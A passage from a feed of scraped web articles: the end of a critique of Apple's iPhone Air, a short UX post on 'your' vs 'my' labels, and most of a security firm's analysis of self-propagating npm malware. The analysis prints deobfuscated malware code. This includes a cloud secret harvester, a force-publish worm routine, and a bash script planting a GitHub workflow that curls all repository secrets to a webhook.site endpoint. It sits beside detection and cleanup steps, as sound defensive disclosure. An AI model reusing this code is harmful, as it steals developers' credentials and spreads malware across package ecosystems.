      &lt;p&gt;And Apple also announced it alongside a special dedicated MagSafe battery accessory, just for this phone, that adds 3,149 mAh, and just barely, combined, will match the 17 Pro in terms of quoted video playback. So if that doesn’t scream red flag, I don’t know what to tell you.&lt;/p&gt;
      &lt;p&gt;It is also e‑SIM-only, globally, ’cause there’s no room in any version of this phone for a plastic SIM card. There’s also no millimeter-wave 5G. And like I said, it’s coming in at $1,000, which is more expensive than the base iPhone, which will have a better camera system, and better battery life, and may overheat less.&lt;/p&gt;
      &lt;p&gt;So look, I think there’s two ways to look at this phone. This is either Apple just throwing something new at the wall and seeing if it sticks. […] Or you can see this as a visionary, long-time-in-the-making preview at the future of all phones. Like, maybe someday in the future every phone will be this thin. And Apple is just now, today, getting the tech together with the battery and display and modem and Apple Silicon to make this phone possible. Maybe kind of like how the first MacBook Air sucked, and was underpowered, but then eventually all laptops became that thin. Maybe that’s also what’s gonna happen to smartphones. And maybe the same way Samsung made the ultra-thin S25 Edge, and then a few months later they came out with their super-thin foldable, the Z Fold7, and I felt like the Edge phone was one half of that foldable. Maybe that’s also what Apple’s doing. Maybe we’re gonna see an ultra-thin foldable iPhone next year. Maybe.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;Yeah, I’m firmly in the “Apple throwing something new at the wall and seeing if it sticks” camp. Because what’s that innovative in having thin smartphones? What’s the usefulness when the other two dimensions keep increasing? Making a thin and light and relatively compact MacBook and calling it ‘Air’ made sense back when virtually no other laptop was that thin and light. It was, and is, a great solution for when you’re out and about or travelling, and space is at a premium; and you also don’t want a bulky computer to lug around.&lt;/p&gt;
    &lt;p&gt;Then Apple applied the ‘Air’ moniker to the iPad, and that started to make less sense. It’s not that a regular or Pro iPad were and are that cumbersome to begin with. And then Apple felt the need to have MacBook Airs that are 13- and 15-inch in size, instead of 11- and 13-inch. A 15-inch MacBook Air makes little sense, too, as an ‘Air’ laptop. It may be somewhat thin, somewhat light, but it’s not exactly compact.&lt;/p&gt;
    &lt;p&gt;And now we have the iPhone Air — which is just thin for thinness’ sake. It’s still a big 6.5‑inch phone that’s hardly pocketable. I still happen to handle and use a few older iPhones in the household, and the dimensions of the iPhone 5/5S/SE make this iPhone more ‘Air’ than the iPhone Air. If you want a slightly more recent example, the iPhone 12 mini and 13 mini have the real lightness that could make sense in a phone. Perhaps you’ll once again remind me that the iPhone 12 mini and 13 mini weren’t a success, but I keep finding people telling me they would favour a more compact phone than a big-but-thin phone. I’ll be truly surprised if the iPhone Air turns out to be a bigger success than the ‘mini’ iPhones. It is a striking device in person, no doubt, but once this first impact is gone and you start thinking it over and making your decision, what Marques Brownlee said above is kind of hard to deny.&lt;/p&gt;
    &lt;p&gt;I find particularly hilarious the whole MagSafe battery accessory affair. Apple creates a super-thin, super-light phone, proudly showcases its striking design, and immediately neutralises this bold move and thin design by offering an accessory 1) that you’ll clearly need if you want to have a decently-lasting battery (thus admitting that that thinness certainly came with an important compromise); and 2) that instantly defeats the purpose of a thin design by returning the bulk that was shaved away in making the phone.&lt;/p&gt;
    &lt;head rend="h2"&gt;What should I be in awe of?&lt;/head&gt;
    &lt;p&gt;I found a lot of reactions to these products to be weirdly optimistic. Either I’m becoming more cynical with age and general tech fatigue, or certain people are easily impressed. What usually impresses me is some technological breakthrough I didn’t see coming, or a clever new device, or some clever system software features and applications that give new purposes to a device I’ve known well for a while. This event, and what was presented, didn’t show any of this.&lt;/p&gt;
    &lt;p&gt;Didn’t you expect Apple to be able to produce yet another iteration of Apple Watches and AirPods that were better than the previous one? Didn’t you expect Apple to be able to make a unibody iPhone after years of making unibody computers? Didn’t you expect Apple to be able to have iPhones with better cameras and recording capabilities than last year’s iPhones? Didn’t you expect Apple to be able to make a thinner iPhone? To come up with better chips? Or a vapour chamber to prevent overheating? Or a ‘centre stage’ feature for the selfie camera? Are these things I should be in awe of?&lt;/p&gt;
    &lt;p&gt;I will probably be genuinely amazed when Apple is finally able to come up with a solution that entirely removes the dynamic island from the front of the iPhone while still having a front-facing camera up there.&lt;/p&gt;
    &lt;p&gt;I’ll be similarly amazed when Apple finally gets rid of people who have shown to know very little about software design and user interfaces, and comes up with operating systems that are, once again, intuitive, discoverable, easy to use, and that both look and work well. Because the iOS, iPadOS, and Mac OS 26 releases are not it — and these new iPhones might be awe-inspiring all you want, but you’ll still have to deal with iOS 26 on them. These new iPhones may have a fantastic hardware and all, but what makes any hardware tick is the software. You’ve probably heard that famous quote by Alan Kay, People who are really serious about software should make their own hardware. Steve Jobs himself quoted it, adding that “this is how we feel about it” at his Apple. Today’s Apple needs to hear a revised version of that quote, something like, People who are this serious about their hardware should make better software for it.&lt;/p&gt;
    &lt;p&gt;The level of good-enough-ism Apple has reached today in software is downright baffling. This widening gap between their hardware and software competence is going to be really damaging if the course isn’t corrected. The tight integration between hardware and software has always been what made Apple platforms stand out. This integration is going to get lost if Apple keeps having wizards for hardware engineers on one side, and software and UI people producing amateurish results on the other side. Relying on legacy and unquestioning fanpeople, for whom everything Apple does is good and awesome and there’s nothing wrong with it, can only go so far. Steve Jobs always knew that software is comparatively more important than the hardware. In a 1994 interview with Jeff Goodell, published by Rolling Stone in 2010 (archived link), Jobs said:&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;The problem is, in hardware you can’t build a computer that’s twice as good as anyone else’s anymore. Too many people know how to do it. You’re lucky if you can do one that’s one and a third times better or one and a half times better. And then it’s only six months before everybody else catches up. But you can do it in software.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;But not if you keep crippling it because you want to bring all your major platforms to the lowest common denominator.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://morrick.me/archives/10137"/><published>2025-09-16T00:20:59+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45257627</id><title>"Your" vs. "My" in user interfaces</title><updated>2025-09-16T16:11:55.588621+00:00</updated><content>&lt;doc fingerprint="ed26d1ac0dd0095d"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;“Your” vs “My” in user interfaces&lt;/head&gt;
    &lt;p&gt;When referring to the user’s stuff, which is better out of these:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;“My account” or “Your account”?&lt;/item&gt;
      &lt;item&gt;“My orders” or “Your orders”?&lt;/item&gt;
      &lt;item&gt;“My cases” or “Your cases”?&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;It’s a trick question because often you don’t need any prefix and can just use:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Account&lt;/item&gt;
      &lt;item&gt;Orders&lt;/item&gt;
      &lt;item&gt;Cases&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Amazon is a good example of this in action because it’s obvious that it’s your account and your orders:&lt;/p&gt;
    &lt;p&gt;But what if your product contains things that belong to you and to others – for example, a case working system that contains your cases and everyone else‘s?&lt;/p&gt;
    &lt;head rend="h2"&gt;The problem with “my”&lt;/head&gt;
    &lt;p&gt;You could use “My cases” in a navigation menu like this:&lt;/p&gt;
    &lt;p&gt;This seems fine on the face of it.&lt;/p&gt;
    &lt;p&gt;But screens are not only accessed or referred to through a menu.&lt;/p&gt;
    &lt;p&gt;For example, you might need to sign post users to their cases in an onboarding flow, email notification or help article.&lt;/p&gt;
    &lt;p&gt;Saying something like “Go to my cases” is awkward and unnatural – if I told you to go to my cases, you’d think I was telling you to go to my cases, not yours.&lt;/p&gt;
    &lt;p&gt;Similarly, a support agent might tell you to “Go to your cases” over webchat or a phone call. This is confusing if the UI says “My cases”.&lt;/p&gt;
    &lt;p&gt;These issues just don’t come up when you use “your” – I’ve used this approach in multiple products over the years, and seen exactly zero issues in user research.&lt;/p&gt;
    &lt;p&gt;So that’s good.&lt;/p&gt;
    &lt;head rend="h2"&gt;“But what if the user is communicating to us using radio buttons, for example?”&lt;/head&gt;
    &lt;p&gt;This is easy if we look at an example:&lt;/p&gt;
    &lt;p&gt;This doesn’t make sense because it sounds like you’re instructing the computer to share their profile, not yours.&lt;/p&gt;
    &lt;p&gt;But it’s clear if you use “my”:&lt;/p&gt;
    &lt;p&gt;In summary:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Use “your” when communicating to the user&lt;/item&gt;
      &lt;item&gt;Use “my” when the user is communicating to us&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;If you’d like to design forms that nail basic details like this, as well as complex problems found in enterprise systems, you might like my course, Form Design Mastery:&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://adamsilver.io/blog/your-vs-my-in-user-interfaces/"/><published>2025-09-16T03:05:53+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45260741</id><title>Self Propagating NPM Malware Compromises over 40 Packages</title><updated>2025-09-16T16:11:55.289699+00:00</updated><content>&lt;doc fingerprint="8c2364128c168402"&gt;
  &lt;main&gt;
    &lt;head rend="h2"&gt;Executive Summary&lt;/head&gt;
    &lt;p&gt;The NPM ecosystem is facing another critical supply chain attack. The popular @ctrl/tinycolor package, which receives over 2 million weekly downloads, has been compromised along with more than 40 other packages across multiple maintainers. This attack demonstrates a concerning evolution in supply chain threats - the malware includes a self-propagating mechanism that automatically infects downstream packages, creating a cascading compromise across the ecosystem. The compromised versions have been removed from npm.&lt;/p&gt;
    &lt;p&gt;The incident was discovered by @franky47, who promptly notified the community through a GitHub issue.&lt;/p&gt;
    &lt;p&gt;In this post, we'll dive deep into the payload's mechanics, including deobfuscated code snippets, API call traces, and diagrams to illustrate the attack chain. Our analysis reveals a Webpack-bundled script (bundle.js) that leverages Node.js modules for reconnaissance, harvesting, and propagation; targeting Linux/macOS devs with access to NPM/GitHub/cloud creds.&lt;/p&gt;
    &lt;head rend="h2"&gt;Community Office Hours&lt;/head&gt;
    &lt;p&gt;StepSecurity is hosting a community Office Hour on 16th September 1PM PST to help answer questions and support recovery efforts.&lt;/p&gt;
    &lt;p&gt;You can register here:Â https://us06web.zoom.us/meeting/register/UwZ9zAThQ-aQgOs4uFG8lw&lt;/p&gt;
    &lt;head rend="h2"&gt;Technical Analysis&lt;/head&gt;
    &lt;p&gt;The attack unfolds through a sophisticated multi-stage chain that leverages Node.js's process.env for opportunistic credential access and employs Webpack-bundled modules for modularity. At the core of this attack is a ~3.6MB minified bundle.js file, which executes asynchronously during npm install. This execution is likely triggered via a hijacked postinstall script embedded in the compromised package.json.&lt;/p&gt;
    &lt;p&gt;Self-Propagation Engineâ&lt;/p&gt;
    &lt;p&gt;The malware includes a self-propagation mechanism through the NpmModule.updatePackage function. This function queries the NPM registry API to fetch up to 20 packages owned by the maintainer, then force-publishes patches to these packages. This creates a cascading compromise effect, recursively injecting the malicious bundle into dependent ecosystems across the NPM registry.&lt;/p&gt;
    &lt;p&gt;Credential Harvestingâ&lt;/p&gt;
    &lt;p&gt;The malware repurposes open-source tools like TruffleHog to scan the filesystem for high-entropy secrets. It searches for patterns such as AWS keys using regular expressions like AKIA[0-9A-Z]{16}. Additionally, the malware dumps the entire process.env, capturing transient tokens such as GITHUB_TOKEN and AWS_ACCESS_KEY_ID.&lt;/p&gt;
    &lt;p&gt;For cloud-specific operations, the malware enumerates AWS Secrets Manager using SDK pagination and accesses Google Cloud Platform secrets via the @google-cloud/secret-manager API. The malware specifically targets the following credentials:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;GitHub personal access tokens&lt;/item&gt;
      &lt;item&gt;AWS access keys (AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY)&lt;/item&gt;
      &lt;item&gt;Google Cloud Platform service credentials&lt;/item&gt;
      &lt;item&gt;Azure credentials&lt;/item&gt;
      &lt;item&gt;Cloud metadata endpoints&lt;/item&gt;
      &lt;item&gt;NPM authentication tokens&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Persistence Mechanismâ&lt;/p&gt;
    &lt;p&gt;The malware establishes persistence by injecting a GitHub Actions workflow file (.github/workflows/shai-hulud-workflow.yml) via a base64-encoded bash script. This workflow triggers on push events and exfiltrates repository secrets using the expression ${{ toJSON(secrets) }} to a command and control endpoint. The malware creates branches by force-merging from the default branch (refs/heads/shai-hulud) using GitHub's /git/refs endpoint.&lt;/p&gt;
    &lt;p&gt;Data Exfiltrationâ&lt;/p&gt;
    &lt;p&gt;The malware aggregates harvested credentials into a JSON payload, which is pretty-printed for readability. It then uploads this data to a new public repository named &lt;code&gt;Shai-Hulud&lt;/code&gt; via the GitHub /user/repos API.&lt;/p&gt;
    &lt;p&gt;The entire attack design assumes Linux or macOS execution environments, checking for os.platform() === 'linux' || 'darwin'. It deliberately skips Windows systems. For a visual breakdown, see the attack flow diagram below:&lt;/p&gt;
    &lt;head rend="h2"&gt;Attack Mechanism&lt;/head&gt;
    &lt;p&gt;The compromise begins with a sophisticated minified JavaScript bundle injected into affected packages like @ctrl/tinycolor. This is not rudimentary malware but rather a sophisticated modular engine that uses Webpack chunks to organize OS utilities, cloud SDKs, and API wrappers.&lt;/p&gt;
    &lt;p&gt;The payload imports six core modules, each serving a specific function in the attack chain.&lt;/p&gt;
    &lt;head rend="h3"&gt;OS Recon (Module 71197)&lt;/head&gt;
    &lt;p&gt;This module calls getSystemInfo() to build a comprehensive system profile containing platform, architecture, platformRaw, and archRaw information. It dumps the entire process.env, capturing sensitive environment variables including AWS_ACCESS_KEY_ID, GITHUB_TOKEN, and other credentials that may be present in the environment.&lt;/p&gt;
    &lt;head rend="h3"&gt;Credential Harvesting Across Clouds&lt;/head&gt;
    &lt;head rend="h4"&gt;AWS (Module 56686)&lt;/head&gt;
    &lt;p&gt;The AWS harvesting module validates credentials using the STS AssumeRoleWithWebIdentityCommand. It then enumerates secrets using the @aws-sdk/client-secrets-manager library.&lt;/p&gt;
    &lt;code&gt;// Deobfuscated AWS harvest snippet
async getAllSecretValues() {
  const secrets = [];
  let nextToken;
  do {
    const resp = await client.send(new ListSecretsCommand({ NextToken: nextToken }));
    for (const secret of resp.SecretList || []) {
      const value = await client.send(new GetSecretValueCommand({ SecretId: secret.ARN }));
      secrets.push({ ARN: secret.ARN, SecretString: value.SecretString, SecretBinary: atob(value.SecretBinary) });  // Base64 decode binaries
    }
    nextToken = resp.NextToken;
  } while (nextToken);
  return secrets;
}&lt;/code&gt;
    &lt;p&gt;The module handles errors such as DecryptionFailure or ResourceNotFoundException silently through decorateServiceException wrappers. It targets all AWS regions via endpoint resolution.&lt;/p&gt;
    &lt;head rend="h4"&gt;GCP (Module 9897)â&lt;/head&gt;
    &lt;p&gt;The GCP module uses @google-cloud/secret-manager to list secrets matching the pattern projects//secrets/. It implements pagination using nextPageToken and returns objects containing the secret name and decoded payload. The module fails silently on PERMISSION_DENIED errors without alerting the user.&lt;/p&gt;
    &lt;head rend="h4"&gt;Filesystem Secret Scanning (Module 94913)&lt;/head&gt;
    &lt;p&gt;This module spawns TruffleHog via child_process.exec('trufflehog filesystem / --json') to scan the entire filesystem. It parses the output for high-entropy matches, such as AWS keys found in ~/.aws/credentials.&lt;/p&gt;
    &lt;head rend="h3"&gt;Propagation Mechanics&lt;/head&gt;
    &lt;head rend="h4"&gt;NPM Pivot (Module 40766)&lt;/head&gt;
    &lt;p&gt;The NPM propagation module parses NPM_TOKEN from either ~/.npmrc or environment variables. After validating the token via the /whoami endpoint, it queries /v1/search?text=maintainer:${username}&amp;amp;size=20 to retrieve packages owned by the maintainer.&lt;/p&gt;
    &lt;code&gt;// Deobfuscated NPM update snippet
async updatePackage(pkg) {
  // Patch package.json (add self as dep?) and publish
  await exec(`npm version patch --force &amp;amp;&amp;amp; npm publish --access public --token ${token}`);
}&lt;/code&gt;
    &lt;p&gt;This creates a cascading effect where an infected package leads to compromised maintainer credentials, which in turn infects all other packages maintained by that user.&lt;/p&gt;
    &lt;head rend="h4"&gt;GitHub Backdoor (Module 82036)â&lt;/head&gt;
    &lt;p&gt;The GitHub backdoor module authenticates via the /user endpoint, requiring repo and workflow scopes. After listing organizations, it injects malicious code via a bash script (Module 941).&lt;/p&gt;
    &lt;p&gt;Here is the line-by-line bash script deconstruction:&lt;/p&gt;
    &lt;code&gt;# Deobfuscated Code snippet
#!/bin/bash
GITHUB_TOKEN="$1"
BRANCH_NAME="shai-hulud"
FILE_NAME=".github/workflows/shai-hulud-workflow.yml"

FILE_CONTENT=$(cat &amp;lt;&amp;lt;'EOF'
on: push  # Trigger on any push
jobs: process
  runs-on: ubuntu-latest
  steps:
  - run: curl -d "$CONTENTS" https://webhook.site/bb8ca5f6-4175-45d2-b042-fc9ebb8170b7;  # C2 exfil
         echo "$CONTENTS" | base64 -w 0 | base64 -w 0  # Double-base64 for evasion
    env: CONTENTS: ${{ toJSON(secrets) }}  # Dumps all repo secrets (GITHUB_TOKEN, AWS keys, etc.)
EOF
)

github_api() { curl -s -X "$1" -H "Authorization: token $GITHUB_TOKEN" ... "$API_BASE$2" }

REPOS_RESPONSE=$(github_api GET "/user/repos?affiliation=owner,collaborator,organization_member&amp;amp;since=2025-01-01T00:00:00Z&amp;amp;per_page=100")

while IFS= read -r repo; do
  # Get default branch SHA
  REF_RESPONSE=$(github_api GET "/repos/$REPO_FULL_NAME/git/ref/heads/$DEFAULT_BRANCH")
  BASE_SHA=$(jq -r '.object.sha' &amp;lt;&amp;lt;&amp;lt; "$REF_RESPONSE")

  BRANCH_DATA=$(jq -n '{ref: "refs/heads/shai-hulud", sha: "$BASE_SHA"}')
  github_api POST "/repos/$REPO_FULL_NAME/git/refs" "$BRANCH_DATA"  # Handles "already exists" gracefully

  FILE_DATA=$(jq -n '{message: "Add workflow", content: "$(base64 &amp;lt;&amp;lt;&amp;lt; "$FILE_CONTENT")", branch: "shai-hulud"}')
  github_api PUT "/repos/$REPO_FULL_NAME/contents/$FILE_NAME" "$FILE_DATA"  # Overwrites if exists
done&lt;/code&gt;
    &lt;p&gt;This mechanism ensures persistence, as secrets are exfiltrated to the command and control server on the next push event.&lt;/p&gt;
    &lt;head rend="h3"&gt;Exfiltrationâ&lt;/head&gt;
    &lt;p&gt;The malware builds a comprehensive JSON payload containing system information, environment variables, and data from all modules. It then creates a public repository via the GitHub /repos POST endpoint using the function &lt;code&gt;makeRepo('Shai-Hulud')&lt;/code&gt;. The repository is public by default to ensure easy access for the command and control infrastructure.&lt;/p&gt;
    &lt;p&gt;The attack employs several evasion techniques including silent error handling (swallowed via catch {} blocks), no logging output, and disguising TruffleHog execution as a legitimate "security scan."&lt;/p&gt;
    &lt;head rend="h2"&gt;Indicators of Compromise&lt;/head&gt;
    &lt;p&gt;The following indicators can help identify systems affected by this attack:&lt;/p&gt;
    &lt;head rend="h3"&gt;GitHub Search Queries for Detection&lt;/head&gt;
    &lt;p&gt;Use these GitHub search queries to identify potentially compromised repositories across your organization:&lt;/p&gt;
    &lt;head rend="h4"&gt;Search for malicious workflow file&lt;/head&gt;
    &lt;p&gt;Replace &lt;code&gt;ACME&lt;/code&gt; with your GitHub organization name and use the following GitHub search query to discover all instance of &lt;code&gt;shai-hulud-workflow.yml&lt;/code&gt; in your GitHub environment.&lt;/p&gt;
    &lt;p&gt;https://github.com/search?q=org%3AACME+path%3A**%2Fshai-hulud-workflow.yml&amp;amp;type=code&lt;/p&gt;
    &lt;head rend="h4"&gt;Search for malicious branch&lt;/head&gt;
    &lt;p&gt;To find malicious branches, you can use the following Bash script:&lt;/p&gt;
    &lt;code&gt;# List all repos and check for shai-hulud branch
gh repo list YOUR_ORG_NAME --limit 1000 --json nameWithOwner --jq '.[].nameWithOwner' | while read repo; do
  gh api "repos/$repo/branches" --jq '.[] | select(.name == "shai-hulud") | "'$repo' has branch: " + .name'
done&lt;/code&gt;
    &lt;head rend="h3"&gt;File Hashes&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;The malicious bundle.js file has a SHA-256 hash of: &lt;code&gt;46faab8ab153fae6e80e7cca38eab363075bb524edd79e42269217a083628f09&lt;/code&gt;&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Network Indicators&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Exfiltration endpoint: &lt;code&gt;https://webhook.site/bb8ca5f6-4175-45d2-b042-fc9ebb8170b7&lt;/code&gt;&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;File System Indicators&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Presence of malicious workflow file: &lt;code&gt;.github/workflows/shai-hulud-workflow.yml&lt;/code&gt;&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Suspicious Function Calls&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Calls to &lt;code&gt;NpmModule.updatePackage&lt;/code&gt;function&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Suspicious API Calls&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;AWS API calls to &lt;code&gt;secretsmanager.*.amazonaws.com&lt;/code&gt;endpoints, particularly&lt;code&gt;BatchGetSecretValueCommand&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;GCP API calls to &lt;code&gt;secretmanager.googleapis.com&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;NPM registry queries to &lt;code&gt;registry.npmjs.org/v1/search&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;GitHub API calls to &lt;code&gt;api.github.com/repos&lt;/code&gt;&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Suspicious Process Executions&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;TruffleHog execution with arguments &lt;code&gt;filesystem /&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;NPM publish commands with &lt;code&gt;--force&lt;/code&gt;flag&lt;/item&gt;
      &lt;item&gt;Curl commands targeting webhook.site domains&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;Affected Packages&lt;/head&gt;
    &lt;p&gt;The following packages have been confirmed as compromised:&lt;/p&gt;
    &lt;head rend="h2"&gt;Immediate Actions Required&lt;/head&gt;
    &lt;p&gt;If you use any of the affected packages, take these actions immediately:&lt;/p&gt;
    &lt;head rend="h3"&gt;Identify and Remove Compromised Packages&lt;/head&gt;
    &lt;code&gt;# Check for affected packages in your project
npm ls @ctrl/tinycolor

# Remove compromised packages
npm uninstall @ctrl/tinycolor

# Search for the known malicious bundle.js by hash
find . -type f -name "*.js" -exec sha256sum {} \; | grep "46faab8ab153fae6e80e7cca38eab363075bb524edd79e42269217a083628f09"&lt;/code&gt;
    &lt;p&gt;â&lt;/p&gt;
    &lt;head rend="h3"&gt;Clean Infected Repositories&lt;/head&gt;
    &lt;head rend="h4"&gt;Remove Malicious GitHub Actions Workflow&lt;/head&gt;
    &lt;code&gt;# Check for and remove the backdoor workflow
rm -f .github/workflows/shai-hulud-workflow.yml

# Look for suspicious 'shai-hulud' branches in all repositories
git ls-remote --heads origin | grep shai-hulud

# Delete any malicious branches found
git push origin --delete shai-hulud&lt;/code&gt;
    &lt;p&gt;â&lt;/p&gt;
    &lt;head rend="h3"&gt;Rotate All Credentials Immediately&lt;/head&gt;
    &lt;p&gt;The malware harvests credentials from multiple sources. Rotate ALL of the following:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;NPM tokens (automation and publish tokens)&lt;/item&gt;
      &lt;item&gt;GitHub personal access tokens&lt;/item&gt;
      &lt;item&gt;GitHub Actions secrets in all repositories&lt;/item&gt;
      &lt;item&gt;SSH keys used for Git operations&lt;/item&gt;
      &lt;item&gt;AWS IAM credentials, access keys, and session tokens&lt;/item&gt;
      &lt;item&gt;Google Cloud service account keys and OAuth tokens&lt;/item&gt;
      &lt;item&gt;Azure service principals and access tokens&lt;/item&gt;
      &lt;item&gt;Any credentials stored in AWS Secrets Manager or GCP Secret Manager&lt;/item&gt;
      &lt;item&gt;API keys found in environment variables&lt;/item&gt;
      &lt;item&gt;Database connection strings&lt;/item&gt;
      &lt;item&gt;Third-party service tokens&lt;/item&gt;
      &lt;item&gt;CI/CD pipeline secrets&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Audit Cloud Infrastructure for Compromise&lt;/head&gt;
    &lt;p&gt;Since the malware specifically targets AWS Secrets Manager and GCP Secret Manager, you need to audit your cloud infrastructure for unauthorized access. The malware uses API calls to enumerate and exfiltrate secrets, so reviewing audit logs is critical to understanding the scope of compromise.&lt;/p&gt;
    &lt;head rend="h4"&gt;AWS Security Audit&lt;/head&gt;
    &lt;p&gt;Start by examining your CloudTrail logs for any suspicious secret access patterns. Look specifically for BatchGetSecretValue, ListSecrets, and GetSecretValue API calls that occurred during the time window when the compromised package may have been installed. Also generate and review IAM credential reports to identify any unusual authentication patterns or newly created access keys.&lt;/p&gt;
    &lt;code&gt;# Check CloudTrail for suspicious secret access
aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=BatchGetSecretValue
aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=ListSecrets
aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=GetSecretValue

# Review IAM credential reports for unusual activity
aws iam get-credential-report --query 'Content'&lt;/code&gt;
    &lt;head rend="h4"&gt;GCP Security Audit&lt;/head&gt;
    &lt;p&gt;For Google Cloud Platform, review your audit logs for any access to the Secret Manager service. The malware uses the @google-cloud/secret-manager library to enumerate secrets, so look for unusual patterns of secret access. Additionally, check for any unauthorized service account key creation, as these could be used for persistent access.&lt;/p&gt;
    &lt;code&gt;# Review secret manager access logs
gcloud logging read "resource.type=secretmanager.googleapis.com" --limit=50 --format=json

# Check for unauthorized service account key creation
gcloud logging read "protoPayload.methodName=google.iam.admin.v1.CreateServiceAccountKey"&lt;/code&gt;
    &lt;head rend="h3"&gt;Monitor for Active Exploitation&lt;/head&gt;
    &lt;head rend="h4"&gt;Network Monitoring&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Block outbound connections to &lt;code&gt;webhook.site&lt;/code&gt;domains immediately&lt;/item&gt;
      &lt;item&gt;Monitor firewall logs for connections to &lt;code&gt;https://webhook.site/bb8ca5f6-4175-45d2-b042-fc9ebb8170b7&lt;/code&gt;&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Implement Security Controls&lt;/head&gt;
    &lt;head rend="h4"&gt;GitHub Security Hardening&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Review and remove unnecessary GitHub Apps and OAuth applications&lt;/item&gt;
      &lt;item&gt;Audit all repository webhooks for unauthorized additions&lt;/item&gt;
      &lt;item&gt;Check deploy keys and repository secrets for all projects&lt;/item&gt;
      &lt;item&gt;Enable branch protection rules to prevent force-pushes&lt;/item&gt;
      &lt;item&gt;Turn on GitHub Secret Scanning alerts&lt;/item&gt;
      &lt;item&gt;Enable Dependabot security updates&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h4"&gt;Ongoing Monitoring&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Set up alerts for any new npm publishes from your organization&lt;/item&gt;
      &lt;item&gt;Monitor CloudTrail/GCP audit logs for secret access patterns&lt;/item&gt;
      &lt;item&gt;Implement regular credential rotation policies&lt;/item&gt;
      &lt;item&gt;Use separate, limited-scope tokens for CI/CD pipelines&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;â&lt;/p&gt;
    &lt;head rend="h3"&gt;For StepSecurity Enterprise Customers&lt;/head&gt;
    &lt;p&gt;The following steps are applicable only for StepSecurity enterprise customers. If you are not an existing enterprise customer, you can start our 14 day free trial by installing the StepSecurity GitHub App to complete the following recovery step.&lt;/p&gt;
    &lt;head rend="h4"&gt;â&lt;lb/&gt;Use NPM Package Cooldown Check&lt;/head&gt;
    &lt;p&gt;The NPMÂ Cooldown check automatically fails a pull request if it introduces an npm package version that was released within the organizationâs configured cooldown period (default: 2 days). Once the cooldown period has passed, the check will clear automatically with no action required. The rationale is simple - most supply chain attacks are detected within the first 24 hours of a malicious package release, and the projects that get compromised are often the ones that rushed to adopt the version immediately. By introducing a short waiting period before allowing new dependencies, teams can reduce their exposure to fresh attacks while still keeping their dependencies up to date.&lt;lb/&gt;Here is an example showing how this check protected a project from using the compromised versions of packages involved in this incident:&lt;/p&gt;
    &lt;p&gt;https://github.com/step-security/test-reporting/pull/16/checks?check_run_id=49850926488&lt;/p&gt;
    &lt;head rend="h4"&gt;Discover Pull Requests upgrading to compromised npm packages&lt;/head&gt;
    &lt;p&gt;We have added a new control specifically to detect pull requests that upgraded to these compromised packages. You can find the new control on the StepSecurity dashboard.&lt;/p&gt;
    &lt;p&gt;â&lt;/p&gt;
    &lt;head rend="h4"&gt;Use StepSecurity Harden-Runner to detect compromised dependencies in CI/CD&lt;/head&gt;
    &lt;p&gt;StepSecurity Harden-Runner adds runtime security monitoring to your GitHub Actions workflows, providing visibility into network calls, file system changes, and process executions during CI/CD runs. Harden-Runner detects the compromised nx packages when they are used in CI/CD. Here is a sample Harden-Runner insights page demonstrating this detection:&lt;/p&gt;
    &lt;p&gt;If you're already using Harden-Runner, we strongly recommend you review recent anomaly detections in your Harden-Runner dashboard. You can get started with Harden-Runner by following the guide at https://docs.stepsecurity.io/harden-runner.&lt;/p&gt;
    &lt;head rend="h4"&gt;Use StepSecurity Artifact Monitor to detect software releases outside of authorized pipelines&lt;/head&gt;
